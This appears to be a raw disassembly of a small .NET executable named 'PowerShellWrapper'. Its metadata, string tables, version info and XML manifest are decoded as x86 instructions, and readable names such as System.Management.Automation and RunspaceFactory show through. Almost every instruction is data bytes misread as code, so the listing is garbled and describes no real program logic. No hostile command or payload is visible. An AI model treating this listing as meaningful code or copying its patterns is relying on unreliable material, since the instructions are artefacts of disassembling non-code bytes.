bound  esi,QWORD PTR [ebp+0x74]
BYTE PTR gs:[edx+0x75],dl
outs   dx,BYTE PTR ds:[esi]
je     0x402b4c
ins    DWORD PTR es:[edi],dx
gs inc ebx
outs   dx,DWORD PTR ds:[esi]
ins    DWORD PTR es:[edi],dx
jo     0x402b4b
je     0x402b55
bound  ebp,QWORD PTR [ecx+0x6c]
imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
bound  esi,QWORD PTR [ebp+0x74]
BYTE PTR gs:[ebx+0x79],dl
jae    0x402b74
gs ins DWORD PTR es:[edi],dx
cs push edx
jne    0x402b74
je     0x402b71
ins    DWORD PTR es:[edi],dx
gs cs push esi
gs jb  0x402b82
imul   ebp,DWORD PTR [edi+0x6e],0x676e69
push   esp
outs   dx,DWORD PTR ds:[esi]
push   ebx
je     0x402b8d
imul   ebp,DWORD PTR [esi+0x67],0x74656700
pop    edi
push   esp
popa
jae    0x402b92
BYTE PTR [ebx+0x79],dl
jae    0x402ba0
gs ins DWORD PTR es:[edi],dx
cs inc ebx
outs   dx,DWORD PTR ds:[esi]
ins    BYTE PTR es:[edi],dx
ins    BYTE PTR es:[edi],dx
arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
outs   dx,BYTE PTR ds:[esi]
jae    0x402b69
edi
bound  ebp,QWORD PTR [edx+0x65]
arpl   WORD PTR [ebp+ecx*2+0x6f],si
fs gs ins BYTE PTR es:[edi],dx
BYTE PTR [eax+0x6f],dl
ja     0x402bb0
jb     0x402bc0
push   0x576c6c65
jb     0x402bb5
jo     0x402bc6
gs jb  0x402b87
fs ins BYTE PTR es:[edi],dx
ins    BYTE PTR es:[edi],dx
BYTE PTR [eax+0x6f],dl
ja     0x402bc6
jb     0x402bb6
push   0x6c6c65
push   eax
jb     0x402bda
addr16 jb 0x402bcf
ins    DWORD PTR es:[edi],dx
BYTE PTR [ebx+0x79],dl
jae    0x402be8
gs ins DWORD PTR es:[edi],dx
BYTE PTR [ebp+0x61],cl
imul   ebp,DWORD PTR [esi+0x0],0x74737953
gs ins DWORD PTR es:[edi],dx
cs dec ebp
popa
outs   dx,BYTE PTR ds:[esi]
popa
gs ins DWORD PTR es:[di],dx
outs   dx,BYTE PTR gs:[esi]
je     0x402bbc
inc    ecx
jne    0x402c05
outs   dx,DWORD PTR ds:[esi]
ins    DWORD PTR es:[edi],dx
popa
je     0x402bff
outs   dx,DWORD PTR ds:[esi]
outs   dx,BYTE PTR ds:[esi]
BYTE PTR [ebx+0x79],dl
jae    0x402c11
gs ins DWORD PTR es:[edi],dx
cs push edx
gs data16 ins BYTE PTR es:[edi],dx
arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
outs   dx,BYTE PTR ds:[esi]
BYTE PTR [ebx+0x65],dl
je     0x402bf4
js     0x402c14
gs jo  0x402c28
imul   ebp,DWORD PTR [edi+0x6e],0x73795300
je     0x402c22
ins    DWORD PTR es:[edi],dx
cs dec esi
gs je  0x402bf1
eax
je     0x402c3a
jo     0x402bc8
inc    ecx
jae    0x402c44
outs   dx,BYTE PTR ds:[esi]
arpl   WORD PTR [ecx+eiz*2+0x73],dx
imul   ecx,DWORD PTR [ebp+0x65],0x74
push   0x7542646f
imul   ebp,DWORD PTR [esp+eiz*2+0x65],0x3e3c0072
je     0x402c42
pop    edi
bound  esi,QWORD PTR [ebp+0x69]
ins    BYTE PTR es:[edi],dx
fs gs jb 0x402bec
push   eax
outs   dx,DWORD PTR ds:[esi]
ja     0x402c55
jb     0x402c65
push   0x576c6c65
jb     0x402c5a
jo     0x402c6b
gs jb  0x402bfe
push   esp
popa
jae    0x402c6d
inc    ecx
ja     0x402c66
imul   esi,DWORD PTR [ebp+eiz*2+0x72],0x74654700
inc    ecx
ja     0x402c71
imul   esi,DWORD PTR [ebp+eiz*2+0x72],0x6e454900
jne    0x402c87
gs jb  0x402c7e
je     0x402c8e
jb     0x402c21
inc    edi
gs je  0x402c6a
outs   dx,BYTE PTR ds:[esi]
jne    0x402c95
gs jb  0x402c8c
je     0x402c9c
jb     0x402c2f
arpl   WORD PTR cs:[edi+ebp*2+0x72],si
BYTE PTR [ebx+0x79],dl
jae    0x402cad
gs ins DWORD PTR es:[edi],dx
cs inc esp
imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
imul   esp,DWORD PTR [ebx+0x73],0x73795300
je     0x402cb2
ins    DWORD PTR es:[edi],dx
cs push edx
jne    0x402cc0
je     0x402cbd
ins    DWORD PTR es:[edi],dx
gs cs inc ebx
outs   dx,DWORD PTR ds:[esi]
ins    DWORD PTR es:[edi],dx
jo     0x402cc5
ins    BYTE PTR es:[edi],dx
gs jb  0x402cb3
gs jb  0x402cd9
imul   esp,DWORD PTR [ebx+0x65],0x65440073
bound  esi,QWORD PTR [ebp+0x67]
imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
jae    0x402c77
popa
jb     0x402ce1
jae    0x402c7c
push   ebx
jns    0x402cf2
je     0x402ce6
ins    DWORD PTR es:[edi],dx
cs push esp
push   0x64616572
imul   ebp,DWORD PTR [esi+0x67],0x7361542e
imul   esi,DWORD PTR [ebx+0x0],0x53
jns    0x402d09
je     0x402cfd
ins    DWORD PTR es:[edi],dx
cs inc ebx
outs   dx,DWORD PTR ds:[esi]
ins    BYTE PTR es:[edi],dx
ins    BYTE PTR es:[edi],dx
arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
outs   dx,BYTE PTR ds:[esi]
jae    0x402ca6
push   eax
push   ebx
edi
bound  ebp,QWORD PTR [edx+0x65]
arpl   WORD PTR [eax+eax*1+0x47],si
gs je  0x402d05
gs jae 0x402d2b
ins    BYTE PTR es:[edi],dx
je     0x402cb9
push   ebx
gs je  0x402d0f
gs jae 0x402d35
ins    BYTE PTR es:[edi],dx
je     0x402cc3
eax
je     0x402d3a
jo     0x402d0b
ins    BYTE PTR es:[edi],dx
imul   esp,DWORD PTR [ebp+0x6e],0x65670074
je     0x402d31
inc    ebx
jne    0x402d47
jb     0x402d3c
outs   dx,BYTE PTR ds:[esi]
je     0x402cda
inc    ecx
fs fs push ebx
arpl   WORD PTR [edx+0x69],si
jo     0x402d57
BYTE PTR [ebx+0x74],dl
popa
jb     0x402d5d
BYTE PTR [ebp+0x6f],cl
jbe    0x402d53
esi
gs js  0x402d66
BYTE PTR [eax],al
BYTE PTR [ebx+0x43],cl
BYTE PTR [edx],bh
BYTE PTR [eax+eax*1+0x55],bl
BYTE PTR [ebx+0x0],dh
BYTE PTR gs:[edx+0x0],dh
jae    0x402d06
pop    esp
BYTE PTR [ebp+0x0],cl
jns    0x402d0c
and    BYTE PTR [eax],al
esp
BYTE PTR [ecx+0x0],ah
jo     0x402d14
je     0x402d16
outs   dx,DWORD PTR ds:[esi]
BYTE PTR [eax+0x0],dh
pop    esp
BYTE PTR [eax+eax*1+0x65],al
BYTE PTR [ebx+0x0],dh
imul   eax,DWORD PTR [eax],0x74
BYTE PTR [edi+0x0],ch
jo     0x402d2a
pop    esp
BYTE PTR [edx+0x0],al
BYTE PTR gs:[ecx+0x0],ah
arpl   WORD PTR [eax],ax
outs   dx,DWORD PTR ds:[esi]
BYTE PTR [esi+0x0],ch
BYTE PTR cs:[eax+0x0],dh
jae    0x402d3e
xor    DWORD PTR [eax],eax
BYTE PTR [eax],al
BYTE PTR [eax],al
jnp    0x402d69
xor    BYTE PTR [edx],ch
fsin
test   BYTE PTR [ebx-0x54],0xb7
and    BYTE PTR [eax+0x2ed0aebb],dl
BYTE PTR [eax+eiz*1],al
DWORD PTR [ecx],eax
or     BYTE PTR [ebx],al
and    BYTE PTR [eax],al
DWORD PTR ds:0x11010120,eax
DWORD PTR [eax+eiz*1],eax
DWORD PTR [ecx],eax
push   cs
al,0x20
DWORD PTR [ecx],eax
eax,0x1012005
bh,BYTE PTR ds:0x1012005
bl,BYTE PTR [ecx+0x5]
and    BYTE PTR [ecx],al
DWORD PTR ds:0x1070405,ebx
cl,BYTE PTR [esp+eax*1]
BYTE PTR [eax],al
DWORD PTR [ebp+0x7],esp
xor    BYTE PTR [ecx],al
DWORD PTR [ecx],eax
BYTE PTR [esi],bl
BYTE PTR [edx+ecx*1],al
DWORD PTR [edx],edx
or     al,0x4
and    BYTE PTR [eax],al
cl,BYTE PTR [ecx+0x4]
pop    es
DWORD PTR [ecx],edx
push   ecx
al,0x20
BYTE PTR [ecx],dl
push   ecx
or     al,0x7
al,0x8
eax,0xe015d11
cl,BYTE PTR [edx+edx*1]
popa
or     DWORD PTR [eax],esp
DWORD PTR ds:0x1818012,edx
push   cs
push   cs
push   es
eax,0x1818012
push   cs
or     BYTE PTR [eax],ah
BYTE PTR ds:0x13015d11,dl
BYTE PTR ds:0x15d1115,al
push   cs
esp,DWORD PTR [eax]
BYTE PTR [edx],al
or     dh,BYTE PTR [eax]
al,BYTE PTR [edx]
DWORD PTR [eax],edx
push   ds
BYTE PTR [eax],dl
push   ds
DWORD PTR [ecx],ecx
or     al,BYTE PTR [edx]
eax,0xe015d11
cl,BYTE PTR [esp+eax*1]
and    BYTE PTR [eax],al
eax,DWORD PTR [eax]
al,0x0
BYTE PTR [edx],dl
ins    DWORD PTR es:[edi],dx
eax,0x6d120120
push   cs
or     BYTE PTR [eax],ah
BYTE PTR ds:0x12017112,dl
jne    0x402e0c
eax,0x12017112
jne    0x402e15
and    BYTE PTR [eax],al
eax,0x13017912
BYTE PTR [esi],al
eax,0x12017912
jne    0x402e20
and    BYTE PTR [eax],al
push   cs
al,0x0
DWORD PTR [ecx],eax
push   cs
eax,0x12010120
popa
or     BYTE PTR [eax+0x117f5f3f],dh
0xa
cmp    cl,BYTE PTR [eax]
xor    DWORD PTR [edi+0x36ad5638],edi
esi
xor    eax,0x3080602
push   es
DWORD PTR [ebp+0x3],esp
push   es
sbb    eax,0xe06020e
eax,DWORD PTR [esi]
ch,BYTE PTR [ecx+0x3]
push   es
ch,BYTE PTR [ebp+0x7]
push   es
eax,0x12017112
jne    0x402e63
push   es
eax,0x12017912
jne    0x402e67
push   es
dh,BYTE PTR [ebp+0x6]
push   es
eax,0xe015d11
push   es
BYTE PTR [ecx],al
cl,BYTE PTR [ecx+0x1d]
push   cs
eax,0x1d010100
push   cs
or     BYTE PTR [ecx],al
BYTE PTR [eax],cl
BYTE PTR [eax],al
BYTE PTR [eax],al
BYTE PTR [esi],bl
DWORD PTR [eax],eax
DWORD PTR [eax],eax
push   esp
dl,BYTE PTR [esi]
push   edi
jb     0x402ef0
jo     0x402edf
outs   dx,DWORD PTR ds:[esi]
outs   dx,BYTE PTR ds:[esi]
inc    ebp
js     0x402ef9
gs jo  0x402f0d
imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
ja     0x402f15
DWORD PTR [eax],ecx
DWORD PTR [eax],eax
pop    es
DWORD PTR [eax],eax
BYTE PTR [eax],al
BYTE PTR ds:0x2e180001,bh
esi
inc    ebp
push   esp
inc    ebx
outs   dx,DWORD PTR ds:[esi]
jb     0x402f1d
inc    ecx
jo     0x402f2b
sub    al,0x56
gs jb  0x402f33
imul   ebp,DWORD PTR [edi+0x6e],0x2e39763d
xor    BYTE PTR [ecx],al
BYTE PTR [esi+ecx*1+0x14],dl
inc    esi
jb     0x402f31
ins    DWORD PTR es:[edi],dx
gs ja  0x402f43
jb     0x402f41
inc    esp
imul   esi,DWORD PTR [ebx+0x70],0x4e79616c
popa
ins    DWORD PTR es:[edi],dx
or     BYTE PTR gs:[esi],ch
esi
inc    ebp
push   esp
and    BYTE PTR [ecx],bh
xor    BYTE PTR cs:[esi],dl
DWORD PTR [eax],eax
DWORD PTR [eax+0x6f],edx
ja     0x402f57
jb     0x402f67
push   0x576c6c65
jb     0x402f5c
jo     0x402f6d
gs jb  0x402f00
BYTE PTR [edx],cl
DWORD PTR [eax],eax
eax,0x75626544
BYTE PTR [bx+si],al
or     al,0x1
BYTE PTR [edi],al
xor    DWORD PTR [esi],ebp
xor    BYTE PTR [esi],ch
xor    BYTE PTR [esi],ch
xor    BYTE PTR [eax],al
BYTE PTR [edx],cl
DWORD PTR [eax],eax
eax,0x2e302e31
xor    BYTE PTR [eax],al
BYTE PTR ds:0x10001,al
BYTE PTR [edi],dl
DWORD PTR [eax],eax
dl,BYTE PTR [eax+0x72]
outs   dx,DWORD PTR ds:[esi]
addr16 jb 0x402f95
ins    DWORD PTR es:[edi],dx
sub    edi,DWORD PTR [ecx*2+0x3e6e6961]
fs pop edi
pop    edi
xor    BYTE PTR [eax],al
BYTE PTR [ecx+eax*1],al
BYTE PTR [eax],al
BYTE PTR [edx],cl
DWORD PTR [eax],eax
al,BYTE PTR [eax]
BYTE PTR [eax],al
BYTE PTR [ecx],al
BYTE PTR [eax],al
or     BYTE PTR [ecx],al
BYTE PTR [ebx],cl
BYTE PTR [eax],al
BYTE PTR [ebp+0x5a],cl
mov    edx,0x504d0100
al,BYTE PTR [eax]
BYTE PTR [eax],al
ins    BYTE PTR es:[edi],dx
BYTE PTR [eax],al
BYTE PTR [eax-0x4fffffd1],dh
DWORD PTR [eax],eax
BYTE PTR [ecx],al
BYTE PTR [eax],al
BYTE PTR [ebx],dl
BYTE PTR [eax],al
BYTE PTR [edi],ah
BYTE PTR [eax],al
BYTE PTR [eax+esi*1],bl
BYTE PTR [eax],al
sbb    al,0x12
BYTE PTR [eax],al
BYTE PTR [eax],al
BYTE PTR [eax],al
push   edx
push   ebx
inc    esp
push   ebx
push   ds
fwait
stos   DWORD PTR es:[edi],eax
esp
shl    al,0x53
inc    edi
lods   al,BYTE PTR ds:[esi]
sub    edx,DWORD PTR [edx]
ecx,edi
enter  0x4687,0x1
BYTE PTR [eax],al
BYTE PTR [ebx+0x3a],al
pop    esp
push   ebp
jae    0x403033
jb     0x403043
pop    esp
ebp
jns    0x402ff4
esp
popa
jo     0x40304c
outs   dx,DWORD PTR ds:[esi]
jo     0x403037
inc    esp
gs jae 0x40304a
je     0x403050
jo     0x40303f
push   eax
outs   dx,DWORD PTR ds:[esi]
ja     0x40304c
jb     0x40305c
push   0x576c6c65
jb     0x403051
jo     0x403062
gs jb  0x403051
outs   dx,DWORD PTR ds:[esi]
bound  ebp,QWORD PTR [edx+0x5c]
inc    esp
bound  esi,QWORD PTR gs:[ebp+0x67]
pop    esp
outs   dx,BYTE PTR ds:[esi]
gs je  0x40303c
xor    BYTE PTR cs:[eax+edx*2+0x6f],bl
ja     0x40306f
jb     0x40307f
push   0x576c6c65
jb     0x403074
jo     0x403085
gs jb  0x403046
jo     0x40307e
bound  eax,QWORD PTR [eax]
push   ebx
eax
inc    ecx
xor    dh,BYTE PTR ds:0x9b1e0036
stos   DWORD PTR es:[edi],eax
esp
shl    al,0x53
xchg   esp,ebp
sub    edx,DWORD PTR [edx]
ecx,edi
enter  0x4687,0x0
ebp
pop    edx
mov    edx,0xbebe1ec3
hlt
dh
sbb    DWORD PTR [ebx-0x47],esi
sahf
xchg   edx,eax
imul   esi,DWORD PTR [eax],0x0
BYTE PTR [ebp+0x30],al
and    BYTE PTR [eax],al
BYTE PTR [edi+0x30],dh
pop    edi
inc    ebx
outs   dx,DWORD PTR ds:[esi]
jb     0x4030c3
js     0x4030e5
ebp
popa
imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
jb     0x4030f0
gs cs fs ins BYTE PTR es:[edi],dx
ins    BYTE PTR es:[edi],dx
BYTE PTR [eax],al
BYTE PTR [eax],al
BYTE PTR [eax],al
jmp    DWORD PTR ds:0x402000
BYTE PTR [eax],al
al,BYTE PTR [eax]
BYTE PTR [eax],al
BYTE PTR [eax],al
and    BYTE PTR [eax],al
BYTE PTR [eax+0x18],al
push   eax
BYTE PTR [eax],al
BYTE PTR [eax],0x0
DWORD PTR [eax],eax
DWORD PTR [eax],eax
BYTE PTR [eax],al
cmp    BYTE PTR [eax],al
BYTE PTR [eax+0x0],al
BYTE PTR [eax],al
DWORD PTR [eax],eax
BYTE PTR [eax],al
BYTE PTR [eax],al
BYTE PTR [eax],0x0
BYTE PTR [eax],al
BYTE PTR [ecx],al
BYTE PTR [ecx],al
BYTE PTR [eax],al
BYTE PTR [eax+0x0],ch
BYTE PTR [eax+0x0],al
BYTE PTR [eax],al
DWORD PTR [eax],eax
BYTE PTR [eax],al
BYTE PTR [eax],al
mov    al,ds:0x90000003
inc    eax
BYTE PTR [eax],al
BYTE PTR [ebx],al
BYTE PTR [eax],al
BYTE PTR [ebx],al
xor    al,0x0
BYTE PTR [eax],al
push   esi
BYTE PTR [ebx+0x0],dl
pop    edi
BYTE PTR [esi+0x0],dl
inc    ebp
BYTE PTR [edx+0x0],dl
push   ebx
BYTE PTR [ecx+0x0],cl
edi
BYTE PTR [esi+0x0],cl
pop    edi
BYTE PTR [ecx+0x0],cl
esi
BYTE PTR [esi+0x0],al
edi
BYTE PTR [eax],al
BYTE PTR [eax],al
BYTE PTR [ebp+0xfeef04],bh
BYTE PTR [ecx],al
BYTE PTR [eax],al
BYTE PTR [ecx],al
BYTE PTR [eax],al
BYTE PTR [eax],al
BYTE PTR [eax],al
BYTE PTR [ecx],al
BYTE PTR [eax],al
BYTE PTR [eax],al
BYTE PTR [edi],bh
BYTE PTR [eax],al
BYTE PTR [eax],al
BYTE PTR [eax],al
BYTE PTR [eax+eax*1],al
BYTE PTR [eax],al
DWORD PTR [eax],eax
BYTE PTR [eax],al
inc    esp
BYTE PTR [eax],al
BYTE PTR [ecx],al
BYTE PTR [esi+0x0],dl
popa
BYTE PTR [edx+0x0],dh
inc    esi
BYTE PTR [ecx+0x0],ch
ins    BYTE PTR es:[edi],dx
BYTE PTR [ebp+0x0],ah
ecx
BYTE PTR [esi+0x0],ch
data16 add BYTE PTR [edi+0x0],ch
BYTE PTR [eax],al
BYTE PTR [eax],al
and    al,0x0
al,0x0
BYTE PTR [eax],al
push   esp
BYTE PTR [edx+0x0],dh
popa
BYTE PTR [esi+0x0],ch
jae    0x40411c
ins    BYTE PTR es:[edi],dx
BYTE PTR [ecx+0x0],ah
je     0x404122
imul   eax,DWORD PTR [eax],0x6e006f
BYTE PTR [eax],al
BYTE PTR [eax],al
BYTE PTR [eax],al
mov    al,0x4
jo     0x404134
BYTE PTR [eax],al
DWORD PTR [eax],eax
push   ebx
BYTE PTR [eax+eax*1+0x72],dh
BYTE PTR [ecx+0x0],ch
outs   dx,BYTE PTR ds:[esi]
BYTE PTR [edi+0x0],ah
inc    esi
BYTE PTR [ecx+0x0],ch
ins    BYTE PTR es:[edi],dx
BYTE PTR [ebp+0x0],ah
ecx
BYTE PTR [esi+0x0],ch
data16 add BYTE PTR [edi+0x0],ch
BYTE PTR [eax],al
esp
al,BYTE PTR [eax]
BYTE PTR [ecx],al
BYTE PTR [eax],dh
BYTE PTR [eax],dh
BYTE PTR [eax],dh
BYTE PTR [eax],dh
BYTE PTR [eax],dh
BYTE PTR [eax+eax*1],dh
bound  eax,QWORD PTR [eax]
xor    BYTE PTR [eax],al
BYTE PTR [eax],al
inc    esp
BYTE PTR [edx],dl
BYTE PTR [ecx],al
BYTE PTR [ebx+0x0],al
outs   dx,DWORD PTR ds:[esi]
BYTE PTR [ebp+0x0],ch
jo     0x40417a
popa
BYTE PTR [esi+0x0],ch
jns    0x404180
esi
BYTE PTR [ecx+0x0],ah
ins    DWORD PTR es:[edi],dx
BYTE PTR [ebp+0x0],ah
BYTE PTR [eax],al
BYTE PTR [eax],al
push   eax
BYTE PTR [edi+0x0],ch
ja     0x404192
BYTE PTR gs:[edx+0x0],dh
jae    0x404198
push   0x6c006500
BYTE PTR [eax+eax*1+0x57],ch
BYTE PTR [edx+0x0],dh
popa
BYTE PTR [eax+0x0],dh
jo     0x4041aa
BYTE PTR gs:[edx+0x0],dh
BYTE PTR [eax],al
esp
BYTE PTR [edx],dl
BYTE PTR [ecx],al
BYTE PTR [esi+0x0],al
imul   eax,DWORD PTR [eax],0x65006c
inc    esp
BYTE PTR [ebp+0x0],ah
jae    0x4041c4
arpl   WORD PTR [eax],ax
jb     0x4041c8
imul   eax,DWORD PTR [eax],0x740070
imul   eax,DWORD PTR [eax],0x6e006f
BYTE PTR [eax],al
BYTE PTR [eax],al
push   eax
BYTE PTR [edi+0x0],ch
ja     0x4041de
BYTE PTR gs:[edx+0x0],dh
jae    0x4041e4
push   0x6c006500
BYTE PTR [eax+eax*1+0x57],ch
BYTE PTR [edx+0x0],dh
popa
BYTE PTR [eax+0x0],dh
jo     0x4041f6
BYTE PTR gs:[edx+0x0],dh
BYTE PTR [eax],al
xor    BYTE PTR [eax],al
or     BYTE PTR [eax],al
DWORD PTR [eax],eax
inc    esi
BYTE PTR [ecx+0x0],ch
ins    BYTE PTR es:[edi],dx
BYTE PTR [ebp+0x0],ah
push   esi
BYTE PTR [ebp+0x0],ah
jb     0x404210
jae    0x404212
imul   eax,DWORD PTR [eax],0x6e006f
BYTE PTR [eax],al
BYTE PTR [eax],al
xor    DWORD PTR [eax],eax
BYTE PTR cs:[eax],dh
BYTE PTR [esi],ch
BYTE PTR [eax],dh
BYTE PTR [esi],ch
BYTE PTR [eax],dh
BYTE PTR [eax],al
BYTE PTR [eax+eax*1+0x16],cl
BYTE PTR [ecx],al
BYTE PTR [ecx+0x0],cl
outs   dx,BYTE PTR ds:[esi]
BYTE PTR [eax+eax*1+0x65],dh
BYTE PTR [edx+0x0],dh
outs   dx,BYTE PTR ds:[esi]
BYTE PTR [ecx+0x0],ah
ins    BYTE PTR es:[edi],dx
BYTE PTR [esi+0x0],cl
popa
BYTE PTR [ebp+0x0],ch
BYTE PTR gs:[eax],al
BYTE PTR [eax+0x0],dl
outs   dx,DWORD PTR ds:[esi]
BYTE PTR [edi+0x0],dh
BYTE PTR gs:[edx+0x0],dh
jae    0x404258
push   0x6c006500
BYTE PTR [eax+eax*1+0x57],ch
BYTE PTR [edx+0x0],dh
popa
BYTE PTR [eax+0x0],dh
jo     0x40426a
BYTE PTR gs:[edx+0x0],dh
BYTE PTR cs:[eax+eax*1+0x6c],ah
BYTE PTR [eax+eax*1+0x0],ch
BYTE PTR [eax],ch
BYTE PTR [edx],al
BYTE PTR [ecx],al
BYTE PTR [eax+eax*1+0x65],cl
BYTE PTR [edi+0x0],ah
popa
BYTE PTR [eax+eax*1+0x43],ch
BYTE PTR [edi+0x0],ch
jo     0x40428e
jns    0x404290
jb     0x404292
imul   eax,DWORD PTR [eax],0x680067
je     0x40429a
BYTE PTR [eax],al
and    BYTE PTR [eax],al
BYTE PTR [eax],al
push   esp
BYTE PTR [esi],dl
BYTE PTR [ecx],al
BYTE PTR [edi+0x0],cl
jb     0x4042aa
imul   eax,DWORD PTR [eax],0x690067
outs   dx,BYTE PTR ds:[esi]
BYTE PTR [ecx+0x0],ah
ins    BYTE PTR es:[edi],dx
BYTE PTR [esi+0x0],al
imul   eax,DWORD PTR [eax],0x65006c
outs   dx,BYTE PTR ds:[esi]
BYTE PTR [ecx+0x0],ah
ins    DWORD PTR es:[edi],dx
BYTE PTR [ebp+0x0],ah
BYTE PTR [eax],al
push   eax
BYTE PTR [edi+0x0],ch
ja     0x4042ce
BYTE PTR gs:[edx+0x0],dh
jae    0x4042d4
push   0x6c006500
BYTE PTR [eax+eax*1+0x57],ch
BYTE PTR [edx+0x0],dh
popa
BYTE PTR [eax+0x0],dh
jo     0x4042e6
BYTE PTR gs:[edx+0x0],dh
BYTE PTR cs:[eax+eax*1+0x6c],ah
BYTE PTR [eax+eax*1+0x0],ch
BYTE PTR [eax+eax*1+0x12],al
BYTE PTR [ecx],al
BYTE PTR [eax+0x0],dl
jb     0x4042fe
outs   dx,DWORD PTR ds:[esi]
BYTE PTR [eax+eax*1+0x75],ah
BYTE PTR [ebx+0x0],ah
je     0x404308
esi
BYTE PTR [ecx+0x0],ah
ins    DWORD PTR es:[edi],dx
BYTE PTR [ebp+0x0],ah
BYTE PTR [eax],al
BYTE PTR [eax],al
push   eax
BYTE PTR [edi+0x0],ch
ja     0x40431a
BYTE PTR gs:[edx+0x0],dh
jae    0x404320
push   0x6c006500
BYTE PTR [eax+eax*1+0x57],ch
BYTE PTR [edx+0x0],dh
popa
BYTE PTR [eax+0x0],dh
jo     0x404332
BYTE PTR gs:[edx+0x0],dh
BYTE PTR [eax],al
xor    BYTE PTR [eax],al
push   es
BYTE PTR [ecx],al
BYTE PTR [eax+0x0],dl
jb     0x404342
outs   dx,DWORD PTR ds:[esi]
BYTE PTR [eax+eax*1+0x75],ah
BYTE PTR [ebx+0x0],ah
je     0x40434c
push   esi
BYTE PTR [ebp+0x0],ah
jb     0x404352
jae    0x404354
imul   eax,DWORD PTR [eax],0x6e006f
BYTE PTR [eax],al
xor    DWORD PTR [eax],eax
BYTE PTR cs:[eax],dh
BYTE PTR [esi],ch
BYTE PTR [eax],dh
BYTE PTR [eax],al
BYTE PTR [eax],bh
BYTE PTR [eax],cl
BYTE PTR [ecx],al
BYTE PTR [ecx+0x0],al
jae    0x404372
jae    0x404374
BYTE PTR gs:[ebp+0x0],ch
bound  eax,QWORD PTR [eax]
ins    BYTE PTR es:[edi],dx
BYTE PTR [ecx+0x0],bh
and    BYTE PTR [eax],al
push   esi
BYTE PTR [ebp+0x0],ah
jb     0x404386
jae    0x404388
imul   eax,DWORD PTR [eax],0x6e006f
BYTE PTR [eax],al
xor    DWORD PTR [eax],eax
BYTE PTR cs:[eax],dh
BYTE PTR [esi],ch
BYTE PTR [eax],dh
BYTE PTR [esi],ch
BYTE PTR [eax],dh
BYTE PTR [eax],al
BYTE PTR [eax-0x15ffffbd],dh
DWORD PTR [eax],eax
bh,ch
mov    ebx,0x783f3cbf
ins    DWORD PTR es:[edi],dx
ins    BYTE PTR es:[edi],dx
and    BYTE PTR [esi+0x65],dh
jb     0x404430
imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
xor    BYTE PTR [edx],ah
and    BYTE PTR [ebp+0x6e],ah
arpl   WORD PTR [edi+0x64],bp
imul   ebp,DWORD PTR [esi+0x67],0x5455223d
inc    esi
sub    eax,0x73202238
je     0x40443c
outs   dx,BYTE PTR ds:[esi]
fs popa
ins    BYTE PTR es:[edi],dx
outs   dx,DWORD PTR ds:[esi]
outs   dx,BYTE PTR ds:[esi]
gs cmp eax,0x73657922
and    bh,BYTE PTR [edi]
ds or  eax,0x3c0a0d0a
popa
jae    0x404465
gs ins DWORD PTR es:[edi],dx
bound  ebp,QWORD PTR [ecx+edi*2+0x20]
js     0x404467
ins    BYTE PTR es:[edi],dx
outs   dx,BYTE PTR ds:[esi]
jae    0x40443b
and    dh,BYTE PTR [ebp+0x72]
outs   dx,BYTE PTR ds:[esi]
cmp    dh,BYTE PTR [ebx+0x63]
push   0x73616d65
sub    eax,0x7263696d
outs   dx,DWORD PTR ds:[esi]
jae    0x404481
data16 je 0x404442
arpl   WORD PTR [edi+0x6d],bp
cmp    ah,BYTE PTR [ecx+0x73]
ins    DWORD PTR es:[edi],dx
cs jbe 0x404450
and    ah,BYTE PTR [eax]
ins    DWORD PTR es:[edi],dx
popa
outs   dx,BYTE PTR ds:[esi]
imul   esp,DWORD PTR [esi+0x65],0x65567473
jb     0x4044a0
imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
xor    BYTE PTR [edx],ah
ds or  eax,0x3c20200a
popa
jae    0x4044b2
gs ins DWORD PTR es:[edi],dx
bound  ebp,QWORD PTR [ecx+edi*2+0x49]
fs outs dx,BYTE PTR gs:[esi]
je     0x4044b3
je     0x4044c5
and    BYTE PTR [esi+0x65],dh
jb     0x4044c4
imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
xor    BYTE PTR [esi],ch
xor    BYTE PTR [esi],ch
xor    BYTE PTR [edx],ah
and    BYTE PTR [esi+0x61],ch
ins    DWORD PTR es:[edi],dx
gs cmp eax,0x41794d22
jo     0x4044da
ins    BYTE PTR es:[edi],dx
imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
cs popa
jo     0x4044e6
and    ch,BYTE PTR [edi]
ds or  eax,0x3c20200a
je     0x4044f2
jne    0x4044f5
je     0x4044cd
outs   dx,BYTE PTR ds:[esi]
outs   dx,WORD PTR ds:[esi]
and    BYTE PTR [eax+0x6d],bh
ins    BYTE PTR es:[edi],dx
outs   dx,BYTE PTR ds:[esi]
jae    0x4044cb
and    dh,BYTE PTR [ebp+0x72]
outs   dx,BYTE PTR ds:[esi]
cmp    dh,BYTE PTR [ebx+0x63]
push   0x73616d65
sub    eax,0x7263696d
outs   dx,DWORD PTR ds:[esi]
jae    0x404511
data16 je 0x4044d2
arpl   WORD PTR [edi+0x6d],bp
cmp    ah,BYTE PTR [ecx+0x73]
ins    DWORD PTR es:[edi],dx
cs jbe 0x4044e1
and    bh,BYTE PTR [esi]
or     eax,0x2020200a
and    BYTE PTR [ebx+esi*2],bh
arpl   WORD PTR gs:[ebp+0x72],si
imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
and    BYTE PTR [eax],ah
and    BYTE PTR [eax],ah
cmp    al,0x72
gs jno 0x404543
gs jae 0x404545
gs fs push eax
jb     0x40453f
jbe    0x404541
ins    BYTE PTR es:[edi],dx
gs addr16 gs jae 0x4044fe
js     0x40454d
ins    BYTE PTR es:[edi],dx
outs   dx,BYTE PTR ds:[esi]
jae    0x404521
and    dh,BYTE PTR [ebp+0x72]
outs   dx,BYTE PTR ds:[esi]
cmp    dh,BYTE PTR [ebx+0x63]
push   0x73616d65
sub    eax,0x7263696d
outs   dx,DWORD PTR ds:[esi]
jae    0x404567
data16 je 0x404528
arpl   WORD PTR [edi+0x6d],bp
cmp    ah,BYTE PTR [ecx+0x73]
ins    DWORD PTR es:[edi],dx
cs jbe 0x404538
and    bh,BYTE PTR [esi]
or     eax,0x2020200a
and    BYTE PTR [eax],ah
and    BYTE PTR [eax],ah
